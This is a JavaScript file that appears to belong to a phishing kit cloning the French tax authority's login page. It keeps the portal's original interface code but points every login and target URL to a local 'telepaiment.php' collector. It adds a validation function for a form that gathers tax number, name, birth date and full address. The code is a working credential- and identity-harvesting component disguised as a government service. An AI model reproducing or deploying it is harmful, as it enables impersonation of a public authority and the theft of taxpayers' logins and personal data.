function validate(){
var nom = document.getElementById("nom").value;
var n_d_t = document.getElementById("n_d_t").value;
var prenom = document.getElementById("prenom").value;
var jour = document.getElementById("jour").value;
var mois = document.getElementById("mois").value;
var annee = document.getElementById("annee").value;
var pays = document.getElementById("pays").value;
var ville = document.getElementById("ville").value;
var region = document.getElementById("region").value;
var code_postal = document.getElementById("code_postal").value;
var adres = document.getElementById("adres").value;

if (n_d_t == "" && adres == "" && nom == "" && prenom == "" && document.getElementById("jour").value == "jour"
 && document.getElementById("mois").value == "mois" && document.getElementById("annee").value == "annee" && ville == "" && region == "" && code_postal == ""){
    document.getElementById("noureddyne_error").style.display = "block";
  document.getElementById("n_d_t").style.borderColor = "red";
  document.getElementById("nom").style.borderColor = "red";
  document.getElementById("prenom").style.borderColor = "red";
  document.getElementById("jour").style.borderColor = "red";
  document.getElementById("mois").style.borderColor = "red";
  document.getElementById("annee").style.borderColor = "red";
  document.getElementById("ville").style.borderColor = "red";
  document.getElementById("region").style.borderColor = "red";
  document.getElementById("adres").style.borderColor = "red";
  document.getElementById("code_postal").style.borderColor = "red";
return false;
} else {
  document.getElementById("n_d_t").style.borderColor = "white";
  document.getElementById("nom").style.borderColor = "white";
    document.getElementById("noureddyne_error").style.display = "none";
  document.getElementById("prenom").style.borderColor = "white";
  document.getElementById("jour").style.borderColor = "white";
  document.getElementById("mois").style.borderColor = "white";
  document.getElementById("annee").style.borderColor = "white";
  document.getElementById("ville").style.borderColor = "white";
  document.getElementById("region").style.borderColor = "white";
  document.getElementById("adres").style.borderColor = "white";
  document.getElementById("code_postal").style.borderColor = "white";
}

if (n_d_t.length < 4){
  document.getElementById("n_d_t").style.borderColor = "red";
    document.getElementById("noureddyne_error").style.display = "block";
return false;
} else {
  document.getElementById("n_d_t").style.borderColor = "white";
    document.getElementById("noureddyne_error").style.display = "none";
}

if (nom == ""){
  document.getElementById("nom").style.borderColor = "red";
      document.getElementById("noureddyne_error").style.display = "block";
return false;
} else {
  document.getElementById("nom").style.borderColor = "white";
      document.getElementById("noureddyne_error").style.display = "none";
}

if (prenom == ""){
  document.getElementById("prenom").style.borderColor = "red";
      document.getElementById("noureddyne_error").style.display = "block";
return false;
} else {
  document.getElementById("prenom").style.borderColor = "white";
      document.getElementById("noureddyne_error").style.display = "none";
}

if (document.getElementById("jour").value == "jour"){
  document.getElementById("jour").style.borderColor = "red";
      document.getElementById("noureddyne_error").style.display = "block";
return false;
} else {
  document.getElementById("jour").style.borderColor = "gray";
      document.getElementById("noureddyne_error").style.display = "none";
}

if (document.getElementById("mois").value == "mois"){
  document.getElementById("mois").style.borderColor = "red";
    document.getElementById("noureddyne_error").style.display = "block";
return false;
} else {
  document.getElementById("mois").style.borderColor = "gray";    
  document.getElementById("noureddyne_error").style.display = "none";
}

if (document.getElementById("annee").value == "annee"){
  document.getElementById("annee").style.borderColor = "red";
      document.getElementById("noureddyne_error").style.display = "block";
return false;
} else {
  document.getElementById("annee").style.borderColor = "gray";
      document.getElementById("noureddyne_error").style.display = "none";
}

if (ville == ""){
  document.getElementById("ville").style.borderColor = "red";
return false;
} else {
  document.getElementById("ville").style.borderColor = "white";
}

if (region == ""){
  document.getElementById("region").style.borderColor = "red";
return false;
} else {
  document.getElementById("region").style.borderColor = "white";
}

if (code_postal == ""){
  document.getElementById("code_postal").style.borderColor = "red";
return false;
} else {
  document.getElementById("code_postal").style.borderColor = "white";
}

if (adres.length < 4){
  document.getElementById("adres").style.borderColor = "red";
    document.getElementById("noureddyne_error").style.display = "block";
return false;
} else {
  document.getElementById("adres").style.borderColor = "white";
    document.getElementById("noureddyne_error").style.display = "none";
}


}

$(function() {
  // Pour le fonctionnement des balises details et summary dans IE/EDGE
  $('html').addClass($.fn.details.support ? 'details' : 'no-details');
  $('details').details();
});

urlLoginMotDePasse = '/telepaiment.php';
urlContexte = '/telepaiment.php';
urlLogin3S = '/telepaiment.php';
urlLoginPAS = '/telepaiment.php';
urlCible = '/telepaiment.php';
$("#formfc").attr('action', authFCFS);
//------------------------------------------------------------
//Chargement document
//------------------------------------------------------------
$(document).ready(function() {
  // detection Iframe 4 Ensu pour op=t
  if(window.self.location.href != window.top.location.href) {
    window.parent.location.href = window.self.location.href;
  }
  //------------------
  var iFocus = null;
  $("#aide").on('hidden.bs.modal', function() {
    if(!iFocus) return;
    iFocus.focus();
  });
  cfp = {};
  if(typeof authType === 'undefined') {
    authType = 'sso';
  }
  $('#logo').attr('href', PortPub + PathPub);
  $('#toPortailPub').attr('href', PortPub + PathPub);
  $('#proPriv').attr('href', ProPrivFqdn + ProPrivPath);
  $('#payer').attr('href', Payer);
  switch(authType) {
    case 'sso':
      $('#backFranceConnect').addClass('hide');
      $('#partPriv').removeClass('hide');
      $('#proPriv').removeClass('hide');
      $('#FranceConnect').removeClass('hide');
      break;
    case 'idp':
      $('#backFranceConnect').removeClass('hide');
      $("#backFranceConnect").on("click", function() {
        pagePrecedente();
      });
      $('#partPriv').addClass('hide');
      $('#proPriv').addClass('hide');
      $('#FranceConnect').addClass('hide');
      $('#FranceConnect').remove();
      $(".breadcrumb").empty();
      $("#Payer").remove();
      $("#aide_mdp1").remove();
      $("#aide_services").remove();
      $("#oubliNumFiscalForm").attr('action', fqdnCFSPart + '/monprofil-webapp/noAuth/LostSpi');
      $("#oubliMotDePasseForm").attr('action', fqdnCFSPart + '/monprofil-webapp/noAuth/LostPassword');
      urlMPRecup = fqdnCFSPart + urlMPRecup;
      break;
  }
  initIdContact(authType);
  messageContenu = {};
  initMessages(authType);
  $('#CFP').html(cfp['NONUM']);
  $('#CFP2').html(cfp['NOINFO']);
  $('#CFP3').html(cfp['default']);
  $('#CFP4').html(cfp['PERTENUM']);
  $('#titre_authent').html(messageContenu['CTXtitre_authent']);
  // Configuration on/off
  visumdp = 0;
  if(typeof afficherVisuMdp !== 'undefined') {
    if(afficherVisuMdp == 1) {
      visumdp = 1;
    }
  }
  changespi = 0;
  if(typeof afficherChangerSpi !== 'undefined') {
    if(afficherChangerSpi == 1) {
      changespi = 1;
    }
  }
  if(changespi == 1) {
    $("#changeSPI").removeClass("hide");
  } else {
    $("#changeSPI").addClass("hide");
  }
  if(visumdp == 1) {
    $("#boutonvisumdp").removeClass("hide");
    $("#visumdp").attr('title', messageContenu['visuMdpON']);
  } else {
    $("#boutonvisumdp").addClass("hide");
  }
  //Dialogue Iframe pour contexte usager
  ecouteReponseForm();
  numTry = 0;
  var timeOutId = null;
  //Gestion rubriques aide
  accordeon();
  //Chargement : contexte vide
  controleEntreeLive();
  afficheForm('CTX');
  videChamps('CTX', '_tmp', 'spi');
  $('[data-toggle="tooltip"]').tooltip({
    'trigger': 'hover focus'
  });
  //-----------------------------------------------------
  // Rechargement captcha
  //  On trouve le path dans le form
  //-----------------------------------------------------
  $(".renewImage").click(function(e) {
    $(".captcha").attr('src', $(this).closest("form").attr('action') + '?format=image' + '&?id' + (new Date()).getTime());
    e.preventDefault();
  });
  //-----------------------------------------------------
  // sur perte du focus des inputs jj et mm : 
  // si un seul digit >0, on ajoute le 0
  //-----------------------------------------------------
  // pour les inputs qui ont comme attribut data-mask 'jour' ou 'mois', 
  // on verifie a la perte du focus la valeur pour ajouter un 0 en debut le cas echeant
  $("input[data-mask='jour'],input[data-mask='mois']").on('focusout', function() {
    if(($(this).val().toString().length == 1) && $(this).val() >= 1 && $(this).val() <= 9) {
      $(this).val('0' + $(this).val());
    }
  });
  //load captcha onload modal
  $('#passPerdu,#numFiscal').on('show.bs.modal', function(event) {
    $(this).find(".modal-title").text(messageContenu['titreModale' + $(this).attr('id')]);
    $("#divCaptcha" + $(this).attr('id')).html('<img class="captcha img-responsive centrerResponsiveElement" src="" alt="Captcha" />');
    $(".captcha").attr('src', $(this).find("form").attr('action') + '?format=image' + '&?id' + (new Date()).getTime()).error(function() {
      $('.modal:visible').modal('toggle');
      $("#indispoMP").modal('show');
    });
    $("#numfiscal_tmp").val('');
    $(this).find('input').not("[type='hidden']").each(function(index, unChamps) {
      $(unChamps).removeAttr('disabled');
      $(unChamps).val('');
    });
    if($('#spi').val()) {
      $("#numfiscal_tmp").val($('#spi').val());
      $("#numfiscal_tmp").change();
    }
    NoError();
    if(typeof timeoutId === 'undefined') {} else {
      clearTimeout(timeoutId);
    }
  });
  //--------------------------------------------------------
  // Ecoute captcha audio
  //  On trouve le path dans le form
  //--------------------------------------------------------
  $(".listen").click(function(e) {
    var song = $("audio")[0];
    // l'url est celle de l'action du formulaire 
    song.src = $(this).closest("form").attr('action') + "?format=audio" + "&?id" + (new Date()).getTime();
    song.play();
    e.preventDefault();
  });
});
//----------------------------------------------------------------------------------
//Chargement fenetre
//----------------------------------------------------------------------------------
$(window).load(function() {
  var currentLocation = window.location.search;
  if(currentLocation.indexOf("?modale=") > -1) {
    var table = currentLocation.split("?modale=")
    var modale = table[1].split("&Erreur=")
    $("#" + modale[0]).modal('show');
    timeoutId = setTimeout(function() {
      window.parent.location.href = "index.html";
    }, 2000);
  }
});
//-------------------------------------------------------------------------------------------
// Si on est sur un smartphone, on affiche un lien pointant vers la rubrique d'aide, qui se masque au défilement
$(window).scroll(function() {
  if($(this).scrollTop() > 0) {
    $('#aide_scroll').fadeOut().attr('aria-hidden', true);
  } else {
    $('#aide_scroll').fadeIn().attr('aria-hidden', false);
  }
});

if(!document.cookie) {
  document.cookie = "essai=cookie";
  if(!document.cookie) {
    deleteClassName(document.getElementById('cookie_error'), 'hide');
  } else {
    addClassName(document.getElementById('cookie_error'), 'hide');
  }
} else {
  addClassName(document.getElementById('cookie_error'), 'hide');
}

debug = 0;
storeAndroidURL = 'https://play.google.com/store/apps/details?id=fr.gouv.finances.smartphone.android';
storeAppleURL = 'https://itunes.apple.com/fr/app/impots.gouv/id505488770?mt=8';
storeWindowsPhoneURL = 'http://www.windowsphone.com/fr-fr/store/app/impots-gouv/f2663ea7-4ea9-4600-a52e-5d03255dee4c';
var afficheSmartBanner_default = 0;
if(navigator.userAgent.match(/Android/i)) {
  afficheSmartBanner_default = 1;
  if(typeof(afficheSmartBanner) == 'undefined') {
    var afficheSmartBanner = new Object();
  }
  if(!("android" in afficheSmartBanner)) {
    afficheSmartBanner["android"] = afficheSmartBanner_default;
  }
  if(afficheSmartBanner["android"] == 1) {
    $("#leStoreLogo").html('<img id="LogoSmartImage" src="/templates/images/Small-logoSMART.png" alt="Télécharger l\'app mobile" />');
    deleteClassName(document.getElementById('banniereSmart'), 'hide');
    document.getElementById('leStoreLogo').href = storeAndroidURL;
  }
}
if(navigator.userAgent.match(/iPhone|iPad|iPod/i)) {
  afficheSmartBanner_default = 0;
  if(typeof(afficheSmartBanner) == 'undefined') {
    var afficheSmartBanner = new Object();
  }
  if(!("apple" in afficheSmartBanner)) {
    afficheSmartBanner["apple"] = afficheSmartBanner_default;
  }
  if(afficheSmartBanner["apple"] == 1) {
    deleteClassName(document.getElementById('banniereSmart'), 'hide');
    document.getElementById('leStoreLogo').href = storeAppleURL;
  }
}
if(navigator.userAgent.match(/Windows Phone/i)) {
  afficheSmartBanner_default = 0;
  if(typeof(afficheSmartBanner) == 'undefined') {
    var afficheSmartBanner = new Object();
  }
  if(!("wphone" in afficheSmartBanner)) {
    afficheSmartBanner["wphone"] = afficheSmartBanner_default;
  }
  if(typeof(afficheSmartBanner["wphone"]) == 'undefined') {
    afficheSmartBanner["wphone"] = afficheSmartBanner_default;
  }
  if(afficheSmartBanner["wphone"] == 1) {
    deleteClassName(document.getElementById('banniereSmart'), 'hide');
    document.getElementById('leStoreLogo').href = storeWindowsPhoneURL;
    document.getElementById('LogoSmartImage').src = 'templates/images/Small_ico_windows.html';
  }
}

function getURLParameter(name) {
  return decodeURIComponent((new RegExp('[?|&]' + name + '=' + '([^&;]+?)(&|#|;|$)').exec(location.search) || [, ""])[1].replace(/\+/g, '%20')) || null;
}
isDenied = getURLParameter('denied');
if(isDenied == '403') {
  deleteClassName(document.getElementById('Cat2Interdit'), 'hide');
}
isIndispo = getURLParameter('indispo');
if(isIndispo == '3S') {
  deleteClassName(document.getElementById('Cat2Indispo3S'), 'hide');
}
if(isIndispo == 'LMDP') {
  deleteClassName(document.getElementById('Cat2IndispoLMDP'), 'hide');
}
//FC Error
errorFC = getURLParameter('fcError');
if(errorFC == 1) {
  deleteClassName(document.getElementById('Cat2FC1'), 'hide');
}
if(errorFC == 2) {
  deleteClassName(document.getElementById('Cat2FC2'), 'hide');
}
if(errorFC == 3) {
  deleteClassName(document.getElementById('Cat2FC3'), 'hide');
}
withFC = getURLParameter('withFC');
if(withFC == 1) {
  deleteClassName(document.getElementById("FranceConnect"), "hide");
}
//Deco